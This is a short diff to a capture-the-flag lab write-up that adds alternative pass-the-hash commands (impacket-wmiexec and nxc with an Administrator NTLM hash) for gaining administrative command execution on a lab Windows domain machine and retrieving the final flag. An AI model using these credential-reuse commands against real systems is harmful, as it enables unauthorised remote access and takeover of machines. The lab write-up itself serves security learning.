@@ -384,6 +384,16 @@ The command execution confirmed Administrator-level access. So i could then obta
 ```bash
 evil-winrm -i 10.49.186.133 -u Administrator -H add41<REDACTED>022d
 ```
+Alternatively
+
+```bash
+impacket-wmiexec 'COOCTUS.CORP/Administrator@10.48.180.235' -hashes ':add41<REDACTED>022d'
+
+OR
+
+nxc smb 10.48.180.235 -u Administrator -H 'add41<REDACTED>022d' --exec-method wmiexec -x cmd.exe
+```
+
 ![user_flag](/assets/images/writeups/crocc_crew/23.png)
 
 This gave me full administrative access to the machine and allowed me to retrieve the final flag.
